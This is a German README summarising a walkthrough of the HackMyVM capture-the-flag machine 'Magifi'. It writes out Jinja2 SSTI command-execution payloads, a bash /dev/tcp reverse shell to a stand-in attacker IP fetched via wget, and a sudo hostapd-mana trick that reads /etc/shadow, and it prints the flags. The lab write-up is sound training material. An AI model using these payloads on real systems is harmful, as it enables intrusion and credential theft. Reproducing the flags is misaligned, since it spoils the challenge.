# Magifi - HackMyVM Lösungsweg

![Magifi VM Icon](Magifi.png)

Dieses Repository enthält einen Lösungsweg (Walkthrough) für die HackMyVM-Maschine "Magifi".

## Details zur Maschine & zum Writeup

*   **VM-Name:** Magifi
*   **VM-Autor:** DarkSpirit
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad (laut Writeup):** Schwer (Hard)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Magifi](https://hackmyvm.eu/machines/machine.php?vm=Magifi)
*   **Autor des Writeups:** DarkSpirit
*   **Original-Link zum Writeup:** [https://alientec1908.github.io/Magifi_HackMyVM_Hard/](https://alientec1908.github.io/Magifi_HackMyVM_Hard/)
*   **Datum des Originalberichts:** 12. Februar 2025

## Verwendete Tools

*   Shell Script (`recon_script.sh`)
*   `arp-scan`
*   `echo`
*   `nmap`
*   `grep`
*   `curl`
*   `nikto`
*   `gobuster`
*   `python3` (insb. `http.server`)
*   `nc` (netcat) / `ncat`
*   `wget`
*   `chmod`
*   `mv`
*   `pwd`
*   `ls`
*   `cat`
*   `ssh`
*   `sudo`
*   `find`
*   `hostapd-mana`
*   `john` (John the Ripper)

## Zusammenfassung des Lösungswegs

Das Folgende ist eine gekürzte Version der Schritte, die unternommen wurden, um die Maschine zu kompromittieren, basierend auf dem bereitgestellten Writeup.

### 1. Reconnaissance (Aufklärung)

*   Ein benutzerdefiniertes Skript (`recon_script.sh`) identifizierte die Ziel-IP `192.168.2.175` und den Hostnamen `magifi.hmv` (Eintrag in `/etc/hosts` des Angreifers).
*   Ein `nmap`-Scan (`nmap -sS -sC -sV -AO -p- $IP -Pn --min-rate 5000`) ergab:
    *   **Port 22/tcp (SSH):** Offen (OpenSSH 8.2p1 Ubuntu).
    *   **Port 80/tcp (HTTP):** Offen (Werkzeug/3.0.4 Python/3.8.10).
        *   Der Nmap-Scan zeigte eine **Weiterleitung (HTTP 302) auf `http://hogwarts.htb`**.
*   Der Hostname `hogwarts.htb` wurde ebenfalls der IP `192.168.2.175` in der `/etc/hosts`-Datei des Angreifers zugeordnet.
*   Ein `nmap`-Vulnerability-Scan (`nmap -sV -A --script vuln ...`) gegen die SSH-Version 8.2p1 identifizierte potenzielle Schwachstellen, darunter **CVE-2023-38408**. Der Webserver wurde als anfällig für **Slowloris DoS (CVE-2007-6750)** eingestuft.

### 2. Web Enumeration (Web-Aufklärung)

*   Scans und manuelle Untersuchung von `http://hogwarts.htb`:
    *   `gobuster` (gegen `http://hogwarts.htb`) fand den Pfad `/upload` (Status 405 - Method Not Allowed, was auf eine POST-Anfrage hindeutet).
    *   Im Quelltext der Webseite wurde ein Upload-Formular für eine Bewerbung gefunden (`action="/upload" method="POST"`).
    *   Das Formular forderte PDF-Dateien, stellte aber eine Vorlage (`application-template.docx`) im DOCX-Format bereit.
    *   Die DOCX-Vorlage enthielt Felder für persönliche Daten (Name, Nachname etc.).

### 3. Initial Access (via Server-Side Template Injection - SSTI)

*   Es wurde vermutet, dass die Felder aus der hochgeladenen DOCX-Datei von einer Template-Engine (wahrscheinlich Jinja2, da Python/Werkzeug) verarbeitet werden.
*   Ein SSTI-Payload wurde in das "Name"-Feld der DOCX-Vorlage eingefügt:
    ```python
    # Beispielhafter SSTI-Payload zum Testen: {{ 7*7 }}
    # Payload zur Ausführung von Befehlen:
    # {{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}
    ```
*   Durch das Hochladen des modifizierten Dokuments wurde bestätigt, dass der Payload ausgeführt wird.
*   **Remote Code Execution (RCE) wurde erreicht.**
*   Um eine Reverse Shell zu erhalten, wurde ein mehrstufiger Ansatz über SSTI verfolgt:
    1.  Ein Python HTTP-Server wurde auf der Angreifer-Maschine gestartet, um Shell-Skripte bereitzustellen.
    2.  Mittels SSTI wurde `wget` auf dem Zielserver genutzt, um ein Reverse-Shell-Skript (z.B. `rever.sh`) vom Angreifer-Server in das `/tmp`-Verzeichnis herunterzuladen.
        *   Inhalt von `rever.sh`: `bash -c "/bin/bash -i >& /dev/tcp/ANGREIFER_IP/4444 0>&1"`
    3.  Ein Netcat-Listener wurde auf der Angreifer-Maschine auf Port 4444 gestartet.
    4.  Mittels SSTI wurde das heruntergeladene Skript `/tmp/rever.sh` ausführbar gemacht und ausgeführt.
        ```python
        # SSTI-Payload zur Ausführung:
        # {{ self.__init__.__globals__.__builtins__.__import__("os").popen("cd /tmp; chmod +x rever.sh; ./rever.sh").read() }}
        ```
*   **Erfolgreicher Initial Access als Benutzer `harry_potter`**.
*   Der öffentliche SSH-Schlüssel des Angreifers wurde in `/home/harry_potter/.ssh/authorized_keys` platziert, um einen stabilen SSH-Zugang zu ermöglichen.

### 4. Privilege Escalation (Privilegienerweiterung)

*   Als Benutzer `harry_potter` wurde `sudo -l` ausgeführt:
    ```
    User harry_potter may run the following commands on MagiFi:
        (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng,
            /usr/bin/airdecap-ng, /usr/bin/hostapd-mana
    ```
*   Die Berechtigung, `hostapd-mana` als `root` ohne Passwort auszuführen, wurde ausgenutzt. `hostapd-mana` erwartet eine Konfigurationsdatei und gibt bei fehlerhafter Syntax den Inhalt der Datei in Fehlermeldungen aus.
*   Auslesen der Root-Flag:
    ```bash
    sudo -u root /usr/bin/hostapd-mana -dd /root/root.txt
    ```
    Die Ausgabe enthielt die Root-Flag in der Fehlermeldung: `Line 1: invalid line 'hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}'`
*   Auslesen von `/etc/shadow`:
    ```bash
    sudo -u root /usr/bin/hostapd-mana -dd /etc/shadow
    ```
    Dies enthüllte die Passwort-Hashes aller Benutzer. Die Hashes wurden gespeichert und ein (abgebrochener) Versuch unternommen, sie mit `john` zu knacken.
*   Die Suche nach SUID-Binaries (`find / -type f -perm -4000 -ls 2>/dev/null`) zeigte u.a. `/usr/bin/xxd_horcrux` und eine verdächtige SUID-PNG-Datei `/home/tom.riddle/.horcrux.png`, die aber für diesen Lösungsweg nicht weiter verfolgt wurden.

### 5. Flags

*   **User-Flag (`/home/harry_potter/user.txt`):**
    ```
    hogwarts{ea4bc74f09fb69771165e57b1b215de9}
    ```
*   **Root-Flag (`/root/root.txt`), ausgelesen via `hostapd-mana`:**
    ```
    hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}
    ```

## Haftungsausschluss (Disclaimer)

Dieser Lösungsweg dient zu Bildungszwecken und zur Dokumentation der Lösung für die "Magifi" HackMyVM-Maschine. Die Informationen sollten nur in ethischen und legalen Kontexten verwendet werden, wie z.B. bei CTFs und autorisierten Penetrationstests.
